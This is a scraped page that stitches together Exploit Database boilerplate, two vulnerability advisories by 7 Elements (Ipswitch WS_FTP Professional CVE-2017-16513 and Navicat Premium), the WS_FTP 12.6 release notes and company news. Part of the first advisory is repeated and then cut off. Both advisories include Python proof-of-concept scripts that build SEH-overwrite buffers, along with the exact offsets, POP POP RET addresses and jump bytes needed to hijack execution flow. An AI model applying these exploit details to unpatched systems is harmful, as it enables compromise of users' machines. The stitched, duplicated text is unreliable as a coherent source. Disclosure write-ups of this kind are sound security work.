##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# CVE-2017-16513 – Ipswitch WS\_FTP Professional Local Buffer Overflow (SEH overwrite)

November 2, 2017 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)
### Advisory Information

**Title: CVE-2017-16513 Ipswitch WS\_FTP Professional Local Buffer Overflow (SEH overwrite)**

**Date Published: 03/11/2017**

### Advisory Summary

The application accepts user input to perform a local search function. Inputting an excessively long string of characters causes the program to crash and for an attacker to gain control of the execution flow of the application. This issue also impacts the “backup location” field.

### Vendor

Ipswitch

### Affected Software

| **Product** | **Version** |
| --- | --- |
| Ipswitch WS\_FTP Professional | 12.6.03 |

### Description of Issue

A local buffer overflow vulnerability was discovered in Ipswitch WS\_FTP Professional version 12.6. This vulnerability was found in the “local search” component of the application. Entering a search string longer than 779 characters will cause the program to crash. It is possible to overwrite the structured exception handler (SEH) after an offset of 840 characters and hijack execution flow of the application. This issue also impacts the “backup location” field and was tested on a 32-bit Windows 7 host.

###

### PoC

The following proof of concept python script will generate a text file with a string to overwrite SEH. Once the file is generated, copy the contents of poc.txt and paste into the local search field to trigger the crash.

---

```

#!/usr/bin/python
#Title: Ipswitch WS_FTP Professional Local Buffer Overflow (SEH overwrite)
#Author: Kevin McGuigan
#Author Website: https://www.7elements.co.uk
#Vendor Website: https://www.ipswitch.com
#nSEH = "\x74\x08\x90\x90"
#SEH = "\x31\x2D\x91\x23"

buffer = "A" * 840
nSEH = "B" * 4
SEH = "C" * 4

f = open ("poc.txt", "w")
f.write(buffer + nSEH + SEH + "D" * 200)
f.close()
```

---

This will result trigger an SEH overwrite, as demonstrated by the following screenshot:

[![SEH Overwrite](https://www.7elements.co.uk/wp-content/uploads/2017/10/ipswitch.png)](https://www.7elements.co.uk/wp-content/uploads/2017/10/ipswitch.png)

From here, we can replace SEH with POP POP RET instructions, located at:

`23912D31`

And replace nSEH with the following code to jump to our payload:

`"\x74\x08\x90\x90"`

Which will land at the payload, represented in the proof of concept as the character ‘D’ (\x44).

[![SEH Overwrite](https://www.7elements.co.uk/wp-content/uploads/2017/10/ipswitch2.png)](https://www.7elements.co.uk/wp-content/uploads/2017/10/ipswitch2.png)

A short video proof-of-concept can be seen below:

### Remediation

This issue has been patched and the patch notes can be found [here](https://docs.ipswitch.com/WS_FTP126/ReleaseNotes/English/index.htm).

The latest version of Ipswitch WS\_FTP Professional can be found on the [Ipswitch website](https://www.ipswitch.com/secure-information-and-file-transfer/wsftp-client).

 [## Security Testing

![](https://www.7elements.co.uk/wp-content/uploads/2020/04/logo_color_crest.png)

At 7 Elements our approach to security testing is based on manual penetration testing techniques and goes further than doing a simple vulnerability scan.

[## Incident Response

![](https://www.7elements.co.uk/wp-content/uploads/2015/01/fingerprint-350x150.jpg)

If you have an ongoing cyber incident call our triage team on 0131 235 2901](/services/incident-response/)

## Cyber Attack Simulation

[![](https://www.7elements.co.uk/wp-content/uploads/2018/11/attack_1-300x166.jpg)](https://www.7elements.co.uk/wp-content/uploads/2018/11/attack_1.jpg)

Cyber Attack Simulation (often referred to as

Red Teaming or ‘scenario based testing’)

brings together our security testing and

threat knowledge gained through extensive

[incident response](https://www.7elements.co.uk/services/incident-response/) experience to generate

complex [scenario based testing engagements](https://www.7elements.co.uk/services/security-testing/).

The scenario goes beyond identifying how an

attacker will gain access, and tests your own

organisation’s capability to detect and respond to

# Release Notes for Ipswitch WS\_FTP Professional 12.6

In this File

# 12.6.x Release Notes

## About this document

This document contains information on how to install and configure WS\_FTP Professional.

## Version 12.6.0.3

| Category | Issue description | ID |
| --- | --- | --- |
| Bug Fix | Added a checkbox, “Enable read ahead,” to the UI that allows users to enable/disable the read file ahead behavior.  In previous releases, transferring file sizes between 3K and 20K using SFTP to/from a NetApp device resulted in 0 length file transfers. Clear the “Enable read ahead” option to correct the reported issue with NetApp devices. | WSCLT-1668 |
| Bug Fix | Updated WS\_FTP Professional to allow access to directories for hardware/software devices (for example, IBM iSeries, AS/400).  In previous releases, changing directories in some devices such as IBM iSeries and AS/400 failed. | WSCLT-1680 |
| Security Issue | Some fields (local search and backup locations) in WS\_FTP Professional allowed users to input data that could possibly overflow local buffers. The application code was modified to only allow certain length strings in the UI and underlying handlers. Thanks to Kevin McGuigan, at 7 Elements, who reported this issue. For more information, see CVE-2017-16513 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16513>. | WSCLT-1729 |

* 1 gigabytes (GB) of memory
* 16 gigabytes (GB) hard drive and 50 MB free disk space during installation

## Installing WS\_FTP Professional

Double-click the downloaded file to start the installation. Follow the instructions on your screen.

## Activating (All applications)

There are four ways to activate a WS\_FTP Professional installation:

* If you installed WS\_FTP Professional using an installation application downloaded from a link in a purchase confirmation email, then the program will be fully functional immediately after installation. No further action is required.
* If you downloaded the installation application from another source, when you run the installation it will ask you for your license serial number and attempt to activate automatically near the end. Enter your serial number and click ****Activate**** to start the license activation process.
* If for some reason you cannot activate your license via Internet connection, you can activate offline. To force offline activation, on the ****Activation**** screen, clear the check mark for ****Use active Internet connection****. Then go to [www.myipswitch.com](http://www.myipswitch.com), click ****Offline Activation****, and follow the instructions displayed.
* If you do not activate the WS\_FTP Professional license during installation or if you upgrade from a previous WS\_FTP Professional version, you can manually activate the WS\_FTP Professional license. Before you start the manual activation process, be sure to have your WS\_FTP Professional serial number, MyIpswitch account name, and password.
  1. Click ****Start > All Programs > Ipswitch WS\_FTP 12 > Manage the WS\_FTP 12 License****.

     **Note**: For Windows 8, press Win+C on your keyboard to open the Charm bar, select ****Search****, and then type ****Manage the WS\_FTP 12 License**** to locate and select it.

Follow the on-screen instructions to enter your product serial number, MyIpswitch account name, and password. When activation is complete, a confirmation page indicates the license has been activated. If activation does not complete successfully, you may be behind a proxy or firewall that is blocking the activation request. In this case, click the ****Offline**** button, then follow the on-screen instructions.

## Silent Install (All Applications)

WS\_FTP Professional install allows for a "silent" (unattended) product install for local computers only.

Silent install requires two operations. The first operation "records" the options that you choose during a normal install, storing them in a local "response" file. The second automatically runs an install on a different computer, based on the options recorded in the file created in the first operation.

This means that if other computers require identical install options to the ones you recorded in a response file, you can use that file to automate installation on those computers. A simple command will automatically perform the installation using the entries recorded in response file. Other than the execution of the command, the install will require no input from the user.

**Note**: If the respective computers do *not* have the same install option requirements, and you nonetheless run the silent install using the same file, an error may result and the install will fail.

To perform a silent install:

1. Initiate the recording to start the response file. Execute the following at a command line or Run dialog:

    `[path+executable].exe -r -f1[path]\setup.iss SERIAL="[serial number + UAP]"`

   where *[path+executable]* is the name of the WS\_FTP install executable you are creating the response file for, plus its location

   ...the second *[path]* is the location where you wish to create the response file

   ...setup.iss is the response file itself (you can name the file a different name if you wish). There should be no space between the option "f1" and the path for the setup.iss file

   **Note**:The "SERIAL=" argument is optional depending on whether your install executable has an embedded serial number, and whether the install machine has Internet connectivity, as described the next section.

   *...[serial number + UAP]* is your assigned serial number + the UAP, which is a security code that you append to the serial number to activate the license. You can find the product name plus the assigned serial number in the My Licenses tab on MyIpswitch.com. A license`s UAP is exposed to users under "Additional License Information." The UAP is displayed only when you are authorized to activate the license on more than one system.

   For example, using all arguments, the command would look like:

    `[c:\downloads\wsftp_install.exe].exe -r -f1c:\silentinstall\setup.iss SERIAL="1X4CF7M10W33XS1OVCCW2ST"`
2. Proceed with the install using the options you wish to record. When you click **Finish**, the install recording will be complete.
3. Execute the silent install on the desired computer by running the following:

 `[path+executable].exe -s -f1[path]\setup.iss SERIAL="[serial number + UAP]"`

where the bracketed values are the same ones mentioned in the previous step. (Again, there should be no space between the option "f1" and the path for the setup.iss file.)

...again, the "SERIAL=" argument is optional depending on whether your install executable has an embedded serial number, and whether the install machine has Internet connectivity, as described in the next section.

For example, using all arguments, the command would look like:

 `[c:\downloads\wsftp_install.exe].exe -s -f1c:\silentinstall\setup.iss SERIAL="1X4CF7M10W33XS1OVCCW2ST"`

After this step, the silent install will proceed with no further input needed.

You can run each of these operations with no specifics after the command. This will perform the operation with default values. The default for the record operation will store the file as "setup.iss" in the system's Windows folder. The execute silent install operation will lookfor a file of that name in the same folder. If there is no .iss file present, the install will fail.

### More on Serial Numbers

You may need to use the SERIAL argument to this command to specify your serial number and to activate your software. Activation of the silent install depends on two factors: whether your install executable has an embedded serial number, and whether the install machine has Internet connectivity. There are three scenarios:

#### You have a downloaded WS\_FTP Professional install executable, which has an embedded serial number and the install machine has Internet connectivity. In this case:

1. Run the command without the SERIAL argument. Activation will occur silently.
2. Run the recorded file without the SERIAL argument. Activation will occur silently.

   Result: You can run the recorded install up to your maximum permissible license activations.

#### You have a downloaded WS\_FTP Professional install executable, which has an embedded serial number and the install machine **does not** have Internet connectivity. In this case:

1. Rename the install executable so that the file name does not include the serial number and UAP.
2. Run the record command without the SERIAL argument. While recording, when the Activation dialog opens, click Cancel to close the dialog and return to the install wizard. Complete the installation.
3. Run the recorded file without the SERIAL argument.

   Result: The WS\_FTP Professional is installed, but does not have a license file.
4. Contact customer service to arrange a license with multiple activations or use offline activation to activate each installation. For offline activation, go to [www.myipswitch.com](http://www.myipswitch.com), click ****Offline Activation****, and follow the instructions displayed.

#### You have a downloaded WS\_FTP Professional install executable, and a separate NSA license file, and the install machine **does not** have Internet connectivity. In this case:

1. Rename the install executable so that the file name does not include the serial number and UAP.
2. Run the record command without the SERIAL argument. There will not be an activation, as you are using the NSA license. Complete the installation.
3. Run the recorded file without the SERIAL argument.

   Result: WS\_FTP Professional is installed, but does not have a license file.
4. Place the license file, named "license.txt" into the the appropriate folder: \ProgramData\Ipswitch\WS\_FTP\

### Setup.log

The install creates a log file in the same directory as the response file: setup.log. The Setup.log file contains three sections. The first section,[InstallShield Silent], identifies the version of InstallShield Silent used in the silent setup. The second section, [Application], identifies the installed application's name and version, and the company name. The third section, [ResponseResult], contains the result code indicating whether or not the silent setup succeeded.

The ResponseResult should show one of two values. If your install failed due to a missing value, you will see a value of "-3" in the log file. This means there was a mismatch between 1) the install requirements of the computer originally used to generate the response file, and 2) the install requirements of the target computer.

For instance, if setup.iss contains setup instructions for an Express install on a particular drive on a fresh machine, but the target machine does not contain the same install folder name, then the silent install will fail because the install steps will be different than the original install.

A ResponseResult of "0" indicates a successful install.

For further information useful in troubleshooting an install, you can also refer to the `WS_FTP_Install.LOG,` which the install writes to the following folders:

64-bit systems: `C:\Windows\SysWow64\`
32-bit systems: `C:\Windows\System32\`

### The SUPPRESSREBOOT option

Some installs will require a reboot, especially installs on computers that have never had a WS\_FTP installation. If you do not want the target computer to reboot, enter the command "SUPPRESSREBOOT" at the end of the command line. For instance:

 `[path+executable].exe -s -f1[path]\setup.iss SUPPRESSREBOOT`

You may need to edit the setup.iss file.

If the setup.iss contains a line with the ending `SdFinishReboot-0`, you will need to replace it with `SdFinish-0.` For instance, you should replace the line--

 `Dlg##={3F464442-A51F-414B-ACA4-78BCF276B346}-SdFinishReboot-0`

...with the line:

 `Dlg##={3F464442-A51F-414B-ACA4-78BCF276B346}-SdFinish-0`

...where "##" represents the install dialog screen number that the line describes.

Similarly, the lines--

 `[{3F464442-A51F-414B-ACA4-78BCF276B346}-SdFinishReboot-0]`
 `Result=6`
 `BootOption=3`

...should be changed to:

 `[{3F464442-A51F-414B-ACA4-78BCF276B346}-SdFinish-0]`
 `Result=1`
 `bOpt1=0`
 `bOpt2=0`

If a reboot was required by the installation, you will still need to perform a reboot for the application to work as expected.

## Silent Uninstall (All Applications)

WS\_FTP Professional install allows for a "silent" (unattended) product uninstall for local computers only.

There are two ways to perform a silent uninstall:

* Record an uninstall file for replay on other machines (does not delete user configuration data)
* Execute Setup.exe silently (deletes all user configuration data)

### Record an Uninstall File for Replay on Other Machines

**Note**: This option does not delete any user configuration data.

Recording a silent uninstall requires two operations. For the first operation you "record" a normal uninstall, storing the uninstall actions in a local "response" file. For the second operation, you run that response file on a different computer to uninstall WS\_FTP silently on that computer. This lets you automate uninstalls on multiple computers. A simple command will automatically perform the uninstall using the options recorded in the response file. Other than the execution of the command, the uninstall will require no input from the user.

To perform a silent uninstall:

1. Initiate the recording to start the response file by executing the following at a command line or Run dialog:

   `[path+executable].exe -uninst -r -f1c:\uninstall.iss`

   where *[path+executable]* is the name of the WS\_FTP uninstall executable you are creating the response file for, plus its location. There should be no space between the option "f1" and the path for the uninstall.iss file.
2. Proceed with the uninstall to record it. When you click Finish, the uninstall recording will be complete.
3. Execute the silent uninstall on the desired computer by running the following:

   `[path+executable].exe -uninst -s -f1C:\uninstall.iss`

   where the bracketed values are the same ones mentioned in the previous step. (Again, there should be no space between "f1" and the path for the uninstall.iss file.)

   After this step, the silent install will proceed with no further input needed.

### Execute Setup.exe Silently

**Note**: This option deletes all user configuration data.

To uninstall the application silently, execute the following command at the command prompt:

32-bit path: `"C:\Program Files (x86)\InstallShield Installation Information\{AD88355B-A4E0-4DA1-BAC3-EA4FEA930691}\setup.exe" silent`

64-bit path: `"C:\Program Files\InstallShield Installation Information\{AD88355B-A4E0-4DA1-BAC3-EA4FEA930691}\setup.exe" silent`

## Terminal services support

Users who use WS\_FTP via terminal services, such as Microsoft Terminal Services or Citrix, must have permission to run WS\_FTP. See our Knowledge Base article on the [minimum permissions required to run WS\_FTP Pro](http://ipswitchft.force.com/kb/articles/FAQ/What-minimum-permissions-are-needed-to-install-and-run-WS-FTP-Pro-1307565975706?retURL=%2Fapex%2FknowledgeProduct&popup=false).

## Security Update: 12.4.1.1 Patch

****Security update on SSL/TLS MITM (Man-in-the-middle) vulnerability (CVE-2014-0224)****: The recent vulnerability uncovered in OpenSSL, has affected vendors and companies that rely on this near-ubiquitous open source security protocol. In basic terms, the vulnerability exposes an OpenSSL to OpenSSL exchange that uses the OpenSSL 0.9.8, 1.0.0 and 1.0.1 family of protocols to an attack. This vulnerability affects the 12.4 and 12.4.1 versions of the WS\_FTP client.

The WS\_FTP 12.4.1.1 patch release upgrades OpenSSL to the 1.0.1h version, which removes this vulnerability.

Check your version number to see if you need to upgrade.

## Security Update: 12.4.1 Patch

****Security Update on Heartbleed SSL****: Heartbleed SSL, the recent vulnerability uncovered in OpenSSL, has affected vendors and companies that rely on this near-ubiquitous open source security protocol. In basic terms, the vulnerability exposes any exchange that uses the OpenSSL 1.0.1 family of protocols to an attack. This vulnerability affects only the 12.4 version of WS\_FTP Pro.

The WS\_FTP Pro 12.4.1 patch release disables the heartbeat function that exposed the vulnerability in the OpenSSL 1.0.1c version and a later release will provide an update to a version of OpenSSL (1.0.1g or later) that has addressed this issue.

If you have an affected version, you have already received a notification from the Ipswitch Security Team. Check your version number to see if you need to upgrade. Systems that may have exposed this vulnerability should regenerate any sensitive information (secret keys, passwords, etc.) with the assumption that an attacker has already used this vulnerability to obtain those items.

## Version 12.5

## Version 12.4

| Category | Issue |
| --- | --- |
| New Feature | Windows 8 Support: This release includes both 32-bit and 64-bit Windows 8 support. |
| Bug Fix | * Pretty Good Privacy (PGP) is an encryption technology used for signing, encrypting, and decrypting various forms of data communications. It facilitates privacy and authentication for texts, emails, and files. Various PGP-related bug fixes in this release include:   + Resolved intermittent decryption crashes:     - The PGP decryption function no longer crashes the WSFTPGUI executable.     - On certain files encrypted with GNUPG, WS\_FTP Pro no longer hangs on the decryption process.     - Various random files were hanging the application on decryption, even though the files were in fact successfully decrypted. This hanging no longer occurs.   WS\_FTP no longer returns "Invalid PGP Signature" when decrypting files larger than 1MB that were encrypted and signed using GNUPG.   * WS\_FTP Pro can now properly encrypt PGP files using a key sent from a specific customer (Megacryption). |
| Bug Fix | WS\_FTP Pro now recognizes SHA256 or SHA512 as valid hash ciphers for key signatures. |
| Bug Fix | WS\_FTP Pro now allows for client certificate lengths of 2048 bits. Previously only 1024-bit SSL client certificates were supported. If you created a certificate in a release prior to WS\_FTP Pro 12.4, the upgrade to 12.4 release will still have the old certificate length of 1024 bit. |
| Bug Fix | The OpenSSL DLLs have been updated to the 1.0.1 branch of OpenSSL. OpenSSL is an open-source implementation of the SSL and TLS protocols. |
| Bug Fix | WS\_FTP previously supported AES block ciphers only. Several public-facing SFTP sites to which customers need to connect have discontinued using block ciphers in response to identified vulnerabilities. In addition to supporting the AES[128/192/256]-CBC cipher, WS\_FTP Pro now supports the AES[128/192/256]-CTR cipher. |
| Bug Fix | Right-click menu option "Send to scheduler" is functional now. |

| New Feature | **SSL session reuse**: In Site Options: SSL, you select to Reuse SSL Session. When making a second connection to the same server, this will use the existing SSL session (rather than creating a new SSL session). This provides an immediate connection without requiring a second login. |
| Menu and Button Change | Renamed the ****File**** main menu to the ****Connections**** menu. |
| Menu and Button Change | Removed the entire ****Edit**** menu. (The ****Copy/Paste**** functions found on this menu are also available as right-click options in file panels.) |
| Menu and Button Change | The ****Connection Wizard**** button and menu item have been folded into the main ****Connect**** button. |
| Menu and Button Change | The ****QuickConnect**** (Toolbar) button and menu item have been replaced with full-blown toolbar support for the ****QuickConnect**** toolbar, accessible and configurable in the same manner that other toolbars were previously. |
| Menu and Button Change | The ****New Backup Job**** and ****Manage Backup Jobs**** buttons have been consolidated into a single ****Backup Files**** button – this matches today’s menu tree item. |
| Menu and Button Change | Similarly, the two synchronization buttons have been consolidated into a single ****Sync Files**** button that matches today’s menu tree item. |
| Menu and Button Change | Removed ****MenuBar**** as a visible type of toolbar. |
| Menu and Button Change | Added a new ****Connections | Sites**** menu tree. |
| Menu and Button Change | Removed ****Properties**** from the ****File**** menu (also available as right-click options in file panels). |
| Menu and Button Change | Removed ****Refresh****, file list options (e.g., ****Large Icons****) and ****Arrange Icons by**** from the View menu (these items were duplicates of the same items found in the context of the file panes). |
| Menu and Button Change | Removed ****Site Manager**** and ****Add to Site Manager**** items from the ****Tools**** menu (these items are duplicates of ****Connect**** items or in-context right-click items). |
| Menu and Button Change | On the ****Tools > Operations After Transfer**** menu, renamed ****Exit Application**** menu item to ****Exit WS\_FTP****. |
| Menu and Button Change | Added or removed ellipses (“�”) from several entries to clarify ellipses, which mean that you will be prompted for more information. (For example, we removed this from ****About**** but added to ****Options****). |
| Bug Fix | HTTP/S security vulnerability fixed: Thank-you to Jeremy Brown for working with our security team on this vulnerability. (Note to other researchers: a message to security@ipswitch.com will always be received.)  This release fixes a "format string" defect that affects HTTP/S hosts - FTP/FTPS/SFTP hosts are not affected. To invoke this vulnerability, a victim must be enticed to connect to a rogue HTTP/S site using WS\_FTP Professional v12 or WS\_FTP Home v12. This defect is fixed in the 12.2 versions of the products, and also available separately in a patch for the v12 version. |
| Bug Fix | Fixed a defect that prevented WS\_FTP from launching when installed on Windows Vista, with the User Account Control (UAC) enabled. The UAC issues have been addressed, so it is no longer necessary to disable the UAC. |
| Bug Fix | Fixed a defect that caused Email notification to work only on servers that accept the "HELO" command. Email notification now also works with mail servers that receive EHLO commands. |
| Bug Fix | Backup wizard (Backup Locations screen) ... If you use the ZIP files before backing up option, to include the current date/time in the name of the destination zip file, include the string "%date" in the file name you enter. WS\_FTP Professional will replace that string with the current date/time in format: yyyymmdd-hhmmss |
| Bug Fix | Fixed a defect with the ****Reuse SSL Session**** option (****Site Options > SSL****). When making a second connection to the same server, use the existing SSL session (rather than creating a new SSL session). This provides an immediate connection without requiring a second login. |
| Bug Fix | Fixed a defect that caused the SSL.log file to fill with errors and grow to a large size. |
| Bug Fix | In many of the prompts in v12, such as New Folder and Change Folder, the cursor was not placed in the text box. This release fixes the problem. |
| Bug Fix | Fixed a defect that caused command line transfers to return an incorrect error code when the file was not found. |
| Bug Fix | The Thumbnail view for the file lists were not centered (in V12), which caused the view to be clipped. This release fixes the problem. |
| Bug Fix | When using a UNC path, the file list view did not refresh when a file was transferred to the UNC. This release fixes the problem. |
| Bug Fix | When doing a silent install, the "- f" in the silent install command should be "-f" with no space between the characters. The documentation includes this correction. |

## Version 12.0.1 Patch Release

|  |  |
| --- | --- |
| We released a patch version (12.0.1) in May 2009 to fix some customer reported issues with the 12 release. The patch is a full version of the software, and should be installed over the 12 installation. This patch addresses the following issues: | |
| Category | Issue |
| Bug Fix | For customers with very large (Microsoft) networks, more than 1,000 nodes that show up via NetBIOS, WS\_FTP Professional 12 hangs while launching, transferring files, or exiting the application.  Although the network discovery thread runs in background, the bookkeeping for the GUI local pane grew exponentially with the size of the network.  This patch includes a fix to limit the number of computers in the Network scan to 500, by default. The value can also be set in the wsftp\_options.ini: under General, add a new key "MaxNetworkScan=<number of computers to scan for>" If the number is 0, scanning is disabled. Otherwise, the scan proceeds to the specified number and then shuts itself off. |
| Bug Fix | Some customers were unable to launch WS\_FTP Professional 12 after upgrading from WS\_FTP Professional 2007.1. This patch fixes the defect that caused initialization of some GUI utilities to fail in certain customer environments. |
| Bug Fix | Fixes a defect that caused SSH/SFTP downloads from some servers to result in an incomplete file. |
| Bug Fix | Fixes a defect that caused HTTP transfers to MOVEit DMZ to fail when MOVEit DMZ is installed in a virtual directory. |

## Version 12

| Category | Issue |
| --- | --- |
| Security | **Built-in local file encryption using OpenPGP**: OpenPGP encryption secures files and folders locally. (WS\_FTP Professional) |
| Security | **FIPS 140-2 validated cryptography**: Federal Information Processing Standards (FIPS) validated cryptography up to 256-bit AES encryption over SSL/SSH protocols and OpenPGP file encryption. (WS\_FTP Professional) |
| Security | **Non-repudiation and compression with MOVEit DMZ server**: Built-in automatic end-to-end file non-repudiation and compression between WS\_FTP Professional Professional and MOVEit DMZ Server. (WS\_FTP Professional) |
| Security | **SSH key management and enhanced SSH capabilities**: SSH user keys can be imported and exported to and from Windows, Unix, and Linux systems. (WS\_FTP Professional) |
| Security | **Enhanced SSL certificate management**: Import full Certificate Authority from PKCS#12 formatted certificates into the Trusted Authority database. |
| Productivity and Performance | **Improved performance**: Quicker display and faster navigation through large directory trees, and when opening/closing the application. |
| Productivity and Performance | **Post transfer file automation**: New file workflow capabilities let users schedule a post transfer action, such as deleting, renaming, or moving the source file after it has been transferred. (WS\_FTP Professional) |
| Productivity and Performance | **Support for Microsoft IIS and Apache web servers**: Connect to and transfer files over HTTP/S connections with Microsoft IIS and Apache web servers with full file/folder listings and navigation. |
| Productivity and Performance | **Windows 2008 support**: WS\_FTP Professional now runs on Microsoft Windows 2008, as well as Windows Server 2003, Windows Vista, and Windows XP. |
| Productivity and Performance | **Licensing**: Activation status and serial number are now displayed in the user interface (****Help > About****). |
| Known Issue | E-Mail Notifications (****Options > E-Mail Notifications****)  When transferring files using the command line utility directly, or using the command line with the Scheduler Utility, the Download failure notification does not work if the file to be downloaded is not found. The workaround is to use the Script Utility to process the download, as the Script Utility will send the Download failure notification when the file is not found. |
| Known Issue | Command line compress option cannot be used with post transfer actions  When using the command line, the -compress option overrides post transfer actions. Post transfer actions will not be run if the compress option is also specified. |

October 9, 2018 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)

We are thrilled to have been nominated for the ‘Best Customer Experience’ award at the 2018 Scottish Cyber Awards!

The Scottish Cyber Awards are back for their third year, and we are delighted to have been nominated for the ‘Best Customer Experience’ award. This nomination means even more to us because all recommendations are from end-users that had directly utilised the services of a Scottish based cyber security organisation, which is a massive honour. We are delighted to be in such good company with Quorum Cyber and Seric Systems.

> The customer experience award aims to credit organisations who are dedicated to providing outstanding service. Companies who have gone over and above what is expected to offer excellent service and act as a standard for organisations across the industry to aim for over the coming year (SBRC 2018).

> David and his team are customer experience wizards – whenever I need their services, they’re there. Dependable, adaptive, clear and reliable. On all the engagements I’ve worked on with 7 Elements I’ve been impressed by David and his team’s responsiveness and capabilities. Genuine passion for the area rather than being sales driven. This goes a long way with me and I’ll keep going back to them on this basis. – 7 Elements Nomination

The winner of this award will be decided via public vote and we hope that we can rely on yours! Voting closes on the 30th October and you can place your votes here:

<https://www.scottishcyberawards.co.uk>

The winner will be announced at the awards dinner on the 28th November at the Sheraton Hotel.

## [ZoneFox Collaboration](https://www.7elements.co.uk/news/zonefox-collaboration/)

August 15, 2018 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)

We are excited to announce our recent partnership with [ZoneFox](https://www.zonefox.com/), to enhance our award winning Incident Response Service.

At 7 Elements we work with clients across the globe, providing expertise in technical information assurance. We use an event-driven approach to Incident Response encompassing five key stages: situational awareness; establishing response parameters; resource deployment; establishing compromise zone and incident classification; followed by incident containment and remediation.

To enhance our situational awareness capability we have partnered with ZoneFox and will be able to deploy the ZoneFox agent as part of our initial response activity.

The ZoneFox solution monitors user behaviour and data movement both on-and-off-network, alerting against malicious or anomalous behaviour. This is achieved through user and entity behaviour analytics (UEBA) and intelligent machine-learning technology that provides 360 visibility across the network and beyond.

Jamie Graves, CEO, ZoneFox said: “Through our work with clients it is becoming increasingly clear that the majority are now using the platform as a cornerstone of their Incident Response strategy. The data and evidence the platform delivers to the business makes it easy to pinpoint vulnerabilities and devise a remediation plan. We’re delighted to be working with 7 Elements and this is definitely an area of the business we will be looking to grow.”

## [Navicat Premium Oracle Connection Buffer Overflow (SEH overwrite) Vulnerability](https://www.7elements.co.uk/resources/technical-advisories/navicat-premium-oracle-connection-buffer-overflow-seh-overwrite/)

May 1, 2018 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)
### Advisory Information

**Title: Navicat Premium Oracle Connection Buffer Overflow (SEH overwrite)**

**Date Published: 01/05/2018**

### Advisory Summary

Inputting an excessively long string of characters into the ‘host’ field when creating a new Oracle connection causes the program to crash. A lack of address space layout randomisation (ASLR) enabled within the software allows an attacker to reliably hijack the execution flow of the application.

### Vendor

PremiumSoft CyberTech Ltd

### Affected Software

| **Product** | **Version** |
| --- | --- |
| NaviCat Premium | <= 12.0.26 |

### Description of Issue

A buffer overflow vulnerability was discovered in NaviCat Premium version 12.0.26. This vulnerability was found in the “New Connection” component of the application. Entering an excessively long string into the host field of a new Oracle connection will cause the program to crash. This crash, combined with a lack of ASLR enabled within the application, allows an attacker to overwrite the structured exception handler (SEH) and hijack execution flow of the application. This issue was tested on a 32-bit Windows 7 host.

###

### PoC

The following proof of concept python script will generate a text file with a string to overwrite SEH. Once the file is generated, copy the contents of navicatPOC.txt and paste into the host field of a new Oracle connection. Test the connection to trigger the crash

---

```

#!/usr/bin/python
# Title: Navicat < 12.0.27 Oracle Connection Overflow
# Author: Kevin McGuigan
# Twitter: @_h3xagram
# Author Website: https://www.7elements.co.uk
# Vendor Website: https://www.navicat.com
# Date: 01/05/2018
# Version: 12.0.26
# Tested on Windows 7 32-bit
# Vendor notified on 04/04/2018. Patch issued on 25/04/2018.

# Generate file > Create new Oracle Connection > paste contents of "navicatPOC.txt" into host field and test connection to trigger overflow.
filename="navicatPOC.txt"
junk = "A" * 1502
#nseh = "\x4C\x4C\x77\x04"
#seh= "\x75\x2a\x01\x10"
nseh = "B" * 4
seh = "C" * 4
fill = "D" * 4000
buffer = junk + nseh + seh + fill
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
```

---

This will result an SEH overwrite, as demonstrated by the following screenshot:

![SEH Overwrite](https://www.7elements.co.uk/wp-content/uploads/2018/05/Screen-Shot-2018-05-01-at-11.01.58.png)

From here, we can replace SEH with POP POP RET instructions, located at 10012a75:

`seh= "\x75\x2a\x01\x10"`

And replace nSEH with the following code to jump to our payload:

`nseh = "\x4C\x4C\x77\x04"`

Which will land at the payload, represented in the proof of concept as the character ‘D’ (\x44).

November 2, 2017 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)
### Advisory Information

**Title: CVE-2017-16513 Ipswitch WS\_FTP Professional Local Buffer Overflow (SEH overwrite)**

**Date Published: 03/11/2017**

### Advisory Summary

The application accepts user input to perform a local search function. Inputting an excessively long string of characters causes the program to crash and for an attacker to gain control of the execution flow of the application. This issue also impacts the “backup location” field.

### Vendor

Ipswitch

### Affected Software

| **Product** | **Version** |
| --- | --- |
| Ipswitch WS\_FTP Professional | 12.6.03 |

### Description of Issue

